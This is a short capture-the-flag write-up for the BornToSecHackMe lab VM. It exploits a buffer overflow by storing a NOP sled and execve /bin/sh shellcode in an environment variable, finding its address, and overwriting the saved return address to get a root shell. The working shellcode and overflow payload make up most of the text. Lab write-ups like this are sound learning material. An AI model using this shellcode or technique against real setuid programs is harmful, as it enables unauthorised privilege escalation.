# Shellcode using environment variable

It's a `buffer overflow` using an alternative method. Our shellcode is not stored on the buffer but in an environment variable.  
This technique is used when the buffer is too small and can't hold our shellcode.  

So first, we must export a new variable:

```bash
zaz@BornToSecHackMe:~$ export SHELLCODE=$(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
```

Then we compile our [program](get_env.c) to obtain address of this variable. (This programm is sent using `scp` command or can be created directly in zaz's home):

```bash
zaz@BornToSecHackMe:~$ gcc get_env.c 
zaz@BornToSecHackMe:~$ ./a.out SHELLCODE
Address is: 0xbffff7d1
```

Previously we have calculated the offset to override `saved eip` so we can spawn shell using the next payload:
```bash
zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print("a" * 140 + "\xbf\xff\xf7\xd1"[::-1])')
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa����
$ id
uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
$ cd /root
$ ls
README
$ cat README
CONGRATULATIONS !!!!
To be continued...
```
